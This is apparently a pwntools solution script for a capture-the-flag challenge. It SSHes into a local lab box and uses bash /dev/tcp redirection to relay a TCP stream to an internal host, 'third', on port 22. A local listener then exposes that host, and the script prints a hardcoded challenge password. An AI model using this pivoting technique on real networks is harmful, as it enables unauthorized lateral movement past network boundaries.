from pwn import *

#context.log_level = 'debug'

p = process(['ssh', 'ctf@localhost', '-p2222'])
p.recvline() # Pseudo-terminal will not ...

### DNS because I didnt know /dev/tcp/.../port would look up domains... ###
#from scapy.all import DNS, DNSQR, IP, UDP
#p.send("exec 666<>/dev/udp/127.0.0.11/53\n".encode())
#dns_req = DNS(rd=1337, qd=DNSQR(qname='third'))
#p.send(b"cat <&666 &\n")
#p.send(b"cat >&666\n")
#p.send(dns_req.build())
#print(DNS(p.recv()))

p.send(b"exec 3<>/dev/tcp/third/22\n")
p.send(b"cat <&3 &\n")
p.send(b"cat >&3\n")
l = listen(2223)
print("ssh ctf@localhost -p2223  # pw: x5kdkwjr8exi2bf70y8g80bggd2nuepf")
svr = l.wait_for_connection()
svr.connect_both(p)
